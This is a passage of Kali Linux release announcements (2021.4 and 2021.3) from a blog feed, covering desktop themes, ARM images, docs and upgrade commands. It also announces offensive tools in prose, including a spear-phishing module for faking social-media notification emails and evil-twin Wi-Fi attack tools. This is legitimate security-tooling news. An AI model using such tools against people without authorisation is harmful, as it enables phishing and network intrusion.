<p>Following the steps of other desktops, the <strong>task manager</strong> has been configured to <strong>&ldquo;icons only&rdquo;</strong>, which, with the slight increase in the panel&rsquo;s height, makes the overall look cleaner and improves multitasking in smaller displays.</p> <p>The <strong>workspaces overview</strong> has been configured to the &ldquo;Buttons&rdquo; appearance, as the previous configuration &ldquo;Miniature view&rdquo; was too wide and a bit confusing for some users. Now that each workspace button takes less space in the panel, we have <strong>increased the default number of workspaces to 4</strong>, as it&rsquo;s a usual arrangement in Linux desktops.</p> <p>To finish with the modifications, a shortcut to <strong>PowerShell</strong> has been added to the terminals dropdown menu. With this addition, you can now choose between the regular terminal, root terminal, and PowerShell.</p> <div class="notices info"> <p data-header="Info"> If you prefer the previous configuration for any of the widgets, you can modify or remove them by pressing <code>Ctrl + Right-Click</code> over it. </p> </div> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/xfce-layout-updates.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/xfce-layout-updates.png" alt="" /> </a> </p> </p> <p>In addition to the Xfce design tweaks, In the image above, we can also observe the new <strong>customized prompt for PowerShell</strong> (in the two-line mode). Same as for <a href="https://pkg.kali.org/pkg/zsh">zsh</a> and <a href="https://pkg.kali.org/pkg/bash">bash</a>, it includes an alternative one-line prompt that can be configured with <code>kali-tweaks</code>.</p> <p><strong>Bonus Tips For Virtual Desktops!</strong></p> <ul> <li>You can add or remove workspaces with the shortcuts: <code>Alt + Insert</code> / <code>Alt + Delete</code></li> <li>You can move through workspaces with the shortcuts: <ul> <li><code>Ctrl + Alt + &lt;ARROW_KEY&gt;</code> to move in the direction of the arrow key. <ul> <li>(if you add <code>Shift</code> you move the current focused window)</li> </ul> </li> <li><code>Ctrl + Alt + &lt;WORKSPACE_NUM&gt;</code> to move to a specific workspace, based on its number.</li> <li><code>Ctrl + Super + &lt;WORKSPACE_NUM&gt;</code> to move a window to a specific workspace, based on its number.</li> </ul> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/workspaces-shortcuts-demo.gif'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/workspaces-shortcuts-demo.gif" alt="" /> </a> </p> </p> <h3 id="gnome-41">GNOME 41</h3> <p>In this update, GNOME desktop has received not one, but two version bumps. It&rsquo;s been one year since the last major update of the GNOME desktop in Kali (with GNOME 3.38) and since then there have been two releases of the desktop environment:</p> <ul> <li><a href="https://help.gnome.org/misc/release-notes/40.0/">Introducing GNOME 40</a></li> <li><a href="https://help.gnome.org/misc/release-notes/41.0/">Introducing GNOME 41</a></li> </ul> <p>All themes and extensions have been updated to support the new shell:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/gnome41.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/gnome41.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/gnome41-overview.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/gnome41-overview.png" alt="" /> </a> </p> </p> <h3 id="kde-523">KDE 5.23</h3> <p>The KDE team celebrated its 25th anniversary releasing the update <a href="https://kde.org/announcements/plasma/5/5.23.0/">5.23</a> of the <strong>Plasma</strong> desktop. This update, now available in Kali, brings a <strong>new design for the Breeze theme</strong>, which improves the look of Plasma with details that add glossiness and style to the desktop. Along with the theme improvements, the <em>System Settings</em> (Under <em>Global Theme &gt; Colors</em>) brings a <em>new option to pick the desktop <strong>accent color</strong></em>.</p> <p>From Kali&rsquo;s side, the new window theme for KDE is now based on the source code of the breeze theme instead of using the <em>Aurorae</em> theme engine. This fixes previous issues with window scaling for <a href="https://www.kali.org/docs/general-use/hidpi/">HiDPI displays</a>.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2021-4-release/https://www.youtube-nocookie.com/embed/RMXViPlehAo?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <h3 id="how-to-upgrade-your-kali-theme">How to Upgrade Your Kali Theme</h3> <p>With these theme changes, you <strong>may not get them if you <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrade</a></strong> Kali. This is because the <strong>theme settings</strong> are <strong>copied</strong> to your <strong>home folder</strong> when your <strong>user is first created</strong>. When you upgrade Kali, it is <strong>upgrading the operating system</strong>, so upgrading <strong>does not alter personal files</strong> <em>(just system files)</em>. As a result, in order to get these theme tweaks, you need to either:</p> <ul> <li>Do a fresh Kali install</li> <li>Create a new user and switch to that</li> <li>Delete your Desktop environment profile for the current user and force reboot. Example of Xfce can be found below:</li> </ul> <pre><code class="language-console">kali@kali:~$ mv ~/.config/xfce4{,-$(date +%Y.%m.%d-%H.%M.%S)} kali@kali:~$ kali@kali:~$ cp -rbi /etc/skel/. ~/ kali@kali:~$ kali@kali:~$ xfce4-session-logout --reboot --fast </code></pre> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/NH-SET.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/NH-SET.png" alt="" /> </a> </p> </p> <p>Thanks to the amazing work of <a href="https://twitter.com/yesimxev">@yesimxev</a>, we have a new addition to the NetHunter app: <strong>The Social-Engineer Toolkit!</strong></p> <p>This release features the first module from SET: the Spear Phishing Email Attack, with many more to come - watch this space&hellip;</p> <p>Now you can use the Kali NetHunter app to customise your own Facebook, Messenger, or Twitter direct message email notifications for your social engineering attacks:</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2021-4-release/videos/setgif.mp4" > Your browser does not support the video tag. </video> <p>Thanks to everyone that contributed to this feature by participating in the <a href="https://twitter.com/yesimxev/status/1451314339554660359">Twitter poll</a>. We could not have done it without your input!</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>Notable changes this release</p> <ul> <li><strong>All images now use ext4 for their root filesystem</strong>, and <strong>resize the root filesystem on first boot</strong>. This results in a speed-up over previous releases which were using ext3, and a reduced boot time on the first reboot when resize happens.</li> <li><strong>Raspberry Pi Zero 2 W support has been added</strong>, but like the Raspberry Pi 400, there is no Nexmon support.</li> <li>Speaking of the <strong>Raspberry Pi Zero 2 W</strong>, since it is so similar to the Zero W, we have also added a <strong>PiTail image</strong> to support the new processor with better performance.</li> <li><strong>Raspberry Pi images now support USB booting</strong> out of the box since we no longer hardcode the root device.</li> <li><strong>Raspberry Pi images now include versioned Nexmon firmware</strong>. A future release of <code>kalipi-config</code> will allow you to switch between them, if you would like to test different versions.</li> <li>Images that use a vendor kernel will now be able to set the regulatory domain properly, so <strong>setting your country will give access to channels properly for wireless</strong>.</li> <li><strong>Pinebook Pro can now be overclocked</strong>. The big cores get 2GHz and the little cores get 1.5GHz added. <ul> <li><code>echo 1 | sudo tee /sys/devices/system/cpu/cpufreq/boost</code> to enable</li> <li><code>echo 0 | sudo tee /sys/devices/system/cpu/cpufreq/boost</code> to disable</li> </ul> </li> <li><strong>USBArmory MkII image has been added</strong>.</li> </ul> <p><strong><a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">Kali ARM build-scripts</a></strong> have seen a massive amount of changes:</p> <ul> <li>They are vastly <strong>more simplified</strong> - thanks to <a href="https://twitter.com/frangalinux">Francisco Jose Rodriguez Martos</a>, and <a href="https://gitlab.com/cyrus104">cyrus104</a> for all of their contributions to make this happen.</li> <li>You can now <strong>choose which desktop</strong> you would like to install (or none at all using <code>--minimal</code>)</li> <li>There is even an option of <strong>no desktop and no tools</strong> (<code>--slim</code>) if you would like to build a custom image up from scratch</li> </ul> <h2 id="kali-docs-updates">Kali-Docs Updates</h2> <ul> <li><a href="https://www.kali.org/docs/tools/flatpak/">Installing Flatpak on Kali Linux</a> is now well documented</li> <li>A new page for the <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-2-w/">Raspberry Pi Zero 2 W</a> has been added</li> <li>The <a href="https://www.kali.org/docs/general-use/kali-branches/">Kali branches</a> page has been refreshed with best practices and references to <code>kali-tweaks</code> that help you follow those best practices to enable (or disable) some of the supplementary repositories.</li> <li>We added a <a href="https://www.kali.org/docs/tools/removed-tools/">list of removed tools</a> so that you can learn why a package got dropped from Kali.</li> <li>Thanks also to <a href="https://gitlab.com/mayomacam">Aman Kumar Maurya</a> for the <a href="https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/">nVidia</a> guide</li> </ul> <p><em>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</em></p> <hr> <h2 id="miscellaneous">Miscellaneous</h2> <p><strong>Kali-Cloud &amp; Cron</strong></p> <p>Some <a href="https://twitter.com/DHAhole">users</a> noticed that the venerable <code>cron</code> <a href="https://pkg.kali.org/pkg/cron">package</a> was missing from the <a href="https://www.kali.org/get-kali/#kali-cloud">Kali AWS Cloud image</a>. This was not intentional, and it&rsquo;s now fixed.</p> <p><strong>Remote Desktop Protocol Audio</strong></p> <p>&ldquo;<em>The quieter you become, the more you are able to hear</em>&rdquo;, goes the saying. And for those running Kali in a VM and using RDP to connect, it&rsquo;s been very quiet indeed, as the sound never worked with this configuration. However this long period of silence is coming to an end! Sound should be enabled and work out of the box from now on. If ever it does not, make yourself heard on the <a href="https://bugs.kali.org/">bug tracker</a> ;)</p> <p><strong>Python Command</strong></p> <p>The command <code>python</code> is no more! Instead, you need to use <code>python3</code> (or <a href="https://www.kali.org/docs/general-use/using-eol-python-versions/">if you have to</a>, <code>python2</code> due it being at <a href="https://www.kali.org/blog/python-2-end-of-life/">End Of Life</a>). Alternatively you can install <code>python-is-python3</code> to restore <code>python</code> as an alias for <code>python3</code>.</p> <h2 id="download-kali-linux-20214">Download Kali Linux 2021.4</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ cp -rbi /etc/skel/. ~ +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2021.4. We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2021.4&quot; VERSION_ID=&quot;2021.4&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP Debian 5.14.16-1kali1 (2021-11-05) +--(kali?kali)-[~] +-$ uname -r 5.14.0-kali4-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Kali Linux 2021.3 Release (OpenSSL, Kali-Tools, Kali Live VM Support, Kali NetHunter Smartwatch)</title>
<link>https://www.kali.org/blog/kali-linux-2021-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2021-3-release/</guid>
<pubDate>Tue, 14 Sep 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2021-3-release/images/banner-2021.3-release.jpg" type="image/jpg"/>
<description><p>Today we have released the newest version of <strong>Kali Linux, 2021.3</strong> <em>(quarter #3)</em>, which is now ready for <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a>.</p> <p>A summary of the <a href="https://bugs.kali.org/changelog_page.php">changes</a> since the <a href="https://www.kali.org/blog/kali-linux-2021-2-release/">2021.2 release from June</a> are:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#openssl-wide-compatibility-by-default">OpenSSL</a></strong> - Wide compatibility by default - Keep reading for what that means</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#kali-tools">New Kali-Tools site</a></strong> - Following the footsteps of Kali-Docs, Kali-Tools has had a complete refresh</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#virtualization-improvements-all-over-the-place">Better VM support in the Live image session</a></strong> - Copy &amp; paste and drag &amp; drop from your machine into a Kali VM by default</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#new-tools-in-kali">New tools</a></strong> - From adversary emulation, to subdomain takeover to Wi-Fi attacks</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#kali-nethunter-updates">Kali NetHunter smartwatch</a></strong> - First of its kind, for TicHunter Pro</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-3-release/#desktop--theme-updates">KDE 5.21</a></strong> - Plasma desktop received a version bump</li> </ul> <hr> <h2 id="openssl-wide-compatibility-by-default">OpenSSL: wide compatibility by default</h2> <p>Going forwards from Kali Linux 2021.3, OpenSSL has now been configured for <strong>wider compatibility</strong> to allow Kali to talk to as many services as possible. This means that legacy protocols <em>(such as TLS 1.0 and TLS 1.1)</em> and older ciphers are <strong>enabled by default</strong>. This is done to help increase Kali&rsquo;s ability to talk to older, obsolete systems and servers that are still using these older protocols. This may potentially increase your options on available attack surfaces <em>(if your target has these End of Life (EoL) services running, having then forgotten about them, what else could this uncover?)</em>. While this is not a configuration that would be good for a general purpose operating systems, this setting makes sense for Kali as it enables the user to engage and talk with more potential targets.</p> <p>This setting is easy to modify via the command-line tool <code>kali-tweaks</code> though. Enter the <em>Hardening</em> section, and from there you can configure OpenSSL for <strong>Strong Security</strong> mode instead, which uses today&rsquo;s current modern standard allowing for secure communication.</p> <p>For more details, refer to the documentation: <a href="https://www.kali.org/docs/general-use/openssl-configuration/">kali.org/docs/general-use/openssl-configuration/</a></p> <h2 id="kali-tools">Kali-Tools</h2> <p>In <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">2019.4</a> we moved our documentation over to our updated <a href="https://www.kali.org/docs/">/docs/</a> page. It&rsquo;s now finally the turn of our <a href="https://www.kali.org/tools/">Kali-Tools</a> site!</p> <p>We have refreshed every aspect of the previous site, giving a new, faster, layout, content, and system! The backend is now in a semi-automated state and more in the open, which like before, allows for anyone to help out and <a href="https://www.kali.org/docs/community/contribute/">contribute</a>.</p> <p>Once these sites have settled down from all the changes and matured a bit, we will start to package these both up, allowing for offline reading.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-3-release/images/kali-tools.png'> <img src="https://www.kali.org/blog/kali-linux-2021-3-release/images/kali-tools.png" alt="" /> </a> </p> </p> <h2 id="virtualization-improvements-all-over-the-place">Virtualization: improvements all over the place</h2> <p>The Kali Live image received some love during this release cycle! We worked hard to make the experience smoother for those who run the Live image in <a href="https://www.kali.org/docs/virtualization/">virtualized environments</a>. Basic features like <strong>copy&rsquo;n&rsquo;paste</strong> and <strong>drag&rsquo;n&rsquo;drop</strong> between the host and the guest should now work out of the box. And this is really for everyone: VMware, VirtualBox, Hyper-V and QEMU+Spice. Did we forget anyone? Drop us a word on the <a href="https://bugs.kali.org/">Kali bug tracker</a>!</p> <p>On the same line: it&rsquo;s now very easy to configure Kali for <a href="https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/learn-more/use-local-resources-on-hyper-v-virtual-machine-with-vmconnect"><strong>Hyper-V Enhanced Session Mode</strong></a>. Open <code>kali-tweaks</code> in a terminal, select <code>Virtualization</code>, and if Kali is running under Hyper-V, you&rsquo;ll see a setting to turn on Hyper-V Enhanced Session Mode. It&rsquo;s now as simple as hitting Enter!</p> <p>If you use this feature, make sure to visit <a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/">kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/</a>, as there are a few additional things to be aware of.</p> <p>Many thanks to <a href="https://gitlab.com/jetbennett">@Shane Bennett</a>, who spent a tremendous amount of time testing this feature, provided extremely detailed feedback all along, and even helped us with the documentation. Kudos Shane!</p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It wouldn&rsquo;t be a Kali release if there weren&rsquo;t any new tools added! A quick run down of what&rsquo;s been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/berate-ap">Berate_ap</a> - Orchestrating MANA rogue Wi-Fi Access Points</li> <li><a href="https://pkg.kali.org/pkg/caldera">CALDERA</a> - Scalable automated adversary emulation platform</li> <li><a href="https://pkg.kali.org/pkg/eaphammer">EAPHammer</a> - Targeted evil twin attacks against WPA2-Enterprise Wi-Fi networks</li> <li><a href="https://pkg.kali.org/pkg/hosthunter">HostHunter</a> - Recon tool for discovering hostnames using OSINT techniques</li> <li><a href="https://pkg.kali.org/pkg/routerkeygenpc">RouterKeygenPC</a> - Generate default WPA/WEP Wi-Fi keys</li> <li><a href="https://pkg.kali.org/pkg/subjack">Subjack</a> - Subdomain takeover</li> <li><a href="https://pkg.kali.org/pkg/wpa-sycophant">WPA_Sycophant</a> - Evil client portion of EAP relay attack</li> </ul> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-3-release/images/NHWheader.png'> <img src="https://www.kali.org/blog/kali-linux-2021-3-release/images/NHWheader.png" alt="" /> </a> </p> </p> <h3 id="kali-nethunter-watch">Kali NetHunter Watch</h3> <p>We proudly introduce the world&rsquo;s <strong>first Kali NetHunter smartwatch, the TicHunter Pro</strong> thanks to the outstanding work of our very own NetHunter developer <a href="https://twitter.com/yesimxev">@yesimxev</a>. It is still experimental, hence the features are limited to USB attacks, and some basic functions. The hardware also has limitations, as such a small battery won&rsquo;t supply enough voltage for any OTG adapters, so huge antennas won&rsquo;t stick out of your wrist! The future is very promising, bringing support for Nexmon and internal bluetooth usage.</p> <p>The image is available on our <a href="https://www.kali.org/get-kali/">download page</a>.</p> <p>Please note that those images contain a &ldquo;nano Kali rootfs&rdquo; due to technical reasons. The detailed installation guide can be found in our <a href="https://www.kali.org/docs/nethunter/installing-nethunter-on-the-ticwatch-pro/">Kali documentation</a>. Feel free to join the adventure!</p> <h3 id="kali-nethunter-installation-via-magisk">Kali NetHunter Installation via Magisk</h3> <p>Thanks to the amazing work of <a href="https://twitter.com/Mominul00650279">@Mominul Islam</a>, we can now bring <strong>Kali NetHunter to Android 11 devices without a fully working TWRP</strong>!</p> <p>Each Kali NetHunter image can be flashed as a Magisk module. This work is still in its infancy and more work is needed to bring it up to par with the traditional installer through TWRP.</p> <p>One of the missing parts is the kernel installation. We haven&rsquo;t been able to install the kernel through Magisk yet. That has to be done via kernel installers like the &ldquo;Franco Kernel Manager&rdquo;. If you are keen to get NetHunter onto your Android 11 device, just give it a crack. If you are interested in helping out with getting the kernel part finished, please get in touch with us through our <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project/-/issues">GitLab issue tracker</a>. Any help is greatly appreciated!</p> <h3 id="kali-nethunter-installation-step-by-step-guide-for-our-preferred-device-the-oneplus-7">Kali NetHunter installation step-by-step guide for our preferred device, the OnePlus 7</h3> <p>Our <strong>preferred device for Kali NetHunter is the OnePlus 7 running Android 10 (stock ROM)</strong>.</p> <p>For a step-by-step installation guide and links to all the files required to restore your phone to the latest stock Android 10 ROM, install TWRP, Magisk and Kali NetHunter, head over to our <a href="https://www.kali.org/docs/nethunter/installing-nethunter-on-the-oneplus-7/">Kali documentation</a> page.</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>We have been busy doing various tweaks and tinkering on our <a href="https://www.kali.org/docs/arm/">Kali ARM images</a>, which covers:</p> <ul> <li>Our <strong><a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">Kali ARM build-scripts</a> have been re-worked</strong>. <ul> <li>Thanks to <a href="https://gitlab.com/cyrus104">@cyrus104</a>, we now have a <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/-/blob/master/gateworks-newport.sh">build-script to support the <strong>Gateworks Newport</strong></a> board, and he also added <a href="https://www.kali.org/docs/arm/gateworks-newport/">documentation</a> for it.</li> <li><a href="https://twitter.com/re4sonkernel">@Re4son</a> contributed a <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/-/blob/master/rpi0w-pitail.sh">build-script</a> for the Raspberry Pi Zero W based <strong><a href="https://whitedome.com.au/re4son/pi-tail/">&ldquo;Pi-Tail&rdquo;</a></strong> <em>(Find <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-pi-tail/">more information here</a>)</em>.</li> <li>Additionally, the RaspberryPi Zero W based <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/-/blob/master/rpi0w-nexmon-p4wnp1-aloa.sh"><strong>&ldquo;P4wnP1&rdquo;</strong> build-script</a> has undergone some major changes.</li> </ul> </li> <li>All images <em>should</em> finally <strong>resize the file-system on the first boot</strong>.</li> <li>We now <strong>re-generate the default snakeoil cert</strong>, which fixes a couple of tools that were failing to run previously.</li> <li>Images default to <code>iptables-legacy</code> and <code>ip6tables-legacy</code> for <strong>iptables support</strong>.</li> <li>We now <strong>set a default locale</strong> of <code>en_US.UTF-8</code> on all images, you can, of course, change this to your preferred locale.</li> <li>The <strong>Kali user</strong> on ARM images is now in all of the <strong>same groups</strong> as base images by default, and uses <strong>zsh</strong> for the default shell. You can change your default shell by using the <code>kali-tweaks</code> tool which also comes pre-installed.</li> <li>Raspberry Pi images can <strong>now use a <code>wpa_supplicant.conf</code> file on the <code>/boot</code> partition</strong>.</li> <li>Raspberry Pi images <strong>now come with <code>kalipi-config</code>, and <code>kalipi-tft-config</code></strong> pre-installed.</li> <li><strong>Pinebook Pro&rsquo;s kernel</strong> has been updated to <strong>5.14</strong>, and you now get <strong>messages on the LCD screen as it&rsquo;s booting</strong>, instead of a blinking cursor until X starts.</li> </ul> <h2 id="desktop--theme-updates">Desktop &amp; Theme Updates</h2> <p>There are also some changes in the desktop space:</p> <ul> <li>Improved GTK3 theme for Xfce&rsquo;s notifications and logout-dialog</li> <li>Redesigned GTK2 theme for a better fit of older programs</li> <li>Improved Kali-Dark and Kali-Light syntax-highlighting themes for GNOME and Xfce</li> </ul> <p>In addition to these changes, one of Kali&rsquo;s preferred desktops, KDE plasma, has received a version bump, now including version <a href="https://kde.org/announcements/plasma/5/5.21.0/">5.21</a>. This update brings an updated look, with a new application launcher and theme improvements. Here&rsquo;s a preview of how it looks with Kali&rsquo;s customization:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-3-release/images/KDE_5.21.png'> <img src="https://www.kali.org/blog/kali-linux-2021-3-release/images/KDE_5.21.png" alt="" /> </a> </p> </p> <h2 id="kali-docs-updates">Kali-Docs Updates</h2> <p>Our documentation site, as well as the pages mentioned already in this blog post, the following other pages have received major changes:</p> <ul> <li><a href="https://www.kali.org/docs/introduction/download-images-securely/">Download Kali Linux Images Securely</a></li> <li><a href="https://www.kali.org/docs/wsl/mesa-21/">Kali Linux &amp; WSL &amp; Mesa</a></li> <li><a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">Kali Linux IRC Channel</a></li> <li><a href="https://www.kali.org/docs/development/contributing-runtime-tests/">Contributing runtime tests</a></li> </ul> <h2 id="gitlab-commit-2021">GitLab Commit 2021</h2> <p>We participated in GitLab&rsquo;s virtual conference this year and <a href="https://twitter.com/g0tmi1k">@g0tmi1k</a> gave a talk on the <a href="https://www.youtube.com/watch?v=M7ixTe-6Oyw">Dynamic between Kali Linux and OffSec</a>. Give it a watch!</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2021-3-release/https://www.youtube-nocookie.com/embed/M7ixTe-6Oyw?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <h2 id="ampere--arm">Ampere &amp; ARM</h2> <p>Following our <a href="https://www.kali.org/blog/ampere/">announcement</a> of our <a href="https://www.kali.org/partnerships/">partnerships</a> with Ampere, we have now fully moved our ARM package building machines over to their hardware, and loving the speed increase! Thank you again to Ampere for the assistance! If you need some ARM servers give them a look! If they are nice enough to help us out this way, we are sure they will treat you good as well.</p> <hr> <h2 id="upcoming-changes">Upcoming Changes</h2> <p>Looking forward, we are going to be announcing the following changes:</p> <ul> <li><strong>Kali-Menu refresh</strong> - We know you may not use it, but for the people who do, we are planning on making some major alterations in its structure. This will hopefully be <strong>live for testing in 2021.4</strong>, and then made default in a later release based on user response. You will be able to change the menu layout by using <code>kali-tweaks</code>. If you want to provide input on this change, get engaged with us and make your voice heard!</li> <li><strong>Load Balancer</strong> (http.kali.org &amp; cdimage.kali.org) - This handles apt packages as well as OS images. We will be switching from MirrorBrain to MirrorBits. We will be soon in touch with all the community mirror maintainers to give them notice of our infrastructure changes. If you would like to become a mirror, please see <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/">our guide</a>.</li> </ul> <hr> <h2 id="download-kali-linux-20213">Download Kali Linux 2021.3</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the those who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ cp -rbi /etc/skel/. ~ +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2021.3. We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2021.3&quot; VERSION_ID=&quot;2021.3&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP Debian 5.10.46-4kali1 (2021-08-09) +--(kali?kali)-[~] +-$ uname -r 5.10.0-kali9-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Kali Linux 2021.2 Release (Kaboxer, Kali-Tweaks, Bleeding-Edge & Privileged Ports)</title>
<link>https://www.kali.org/blog/kali-linux-2021-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2021-2-release/</guid>
<pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2021-2-release/images/banner-2021.2-release.jpg" type="image/jpg"/>
